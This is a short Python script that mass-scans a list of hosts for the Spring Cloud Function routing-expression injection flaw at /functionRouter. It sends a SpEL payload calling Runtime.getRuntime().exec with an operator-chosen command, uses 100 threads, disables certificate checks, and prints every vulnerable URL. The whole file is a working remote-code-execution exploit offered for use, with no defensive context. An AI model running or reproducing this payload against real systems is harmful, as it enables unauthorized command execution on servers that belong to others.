import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exp(host):
    host = host.strip()
    if host[:4] != "http":
        host = "http://" + host
    url = host + "/functionRouter"
    headers ={
        'Content-Length': '1'
    }
    data1="spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(" + cmd + ")"
    try:
        r = requests.post(url=url, timeout=6, data=data1, verify=False,headers=headers)
        if r.status_code==200:
            print(url)
    except:
        pass


if __name__ == '__main__':
    cmd = "command"
    with ThreadPoolExecutor(max_workers=100) as pool:
        with open(sys.argv[1], 'r') as f:
            task = [pool.submit(exp, url) for url in f.readlines()]
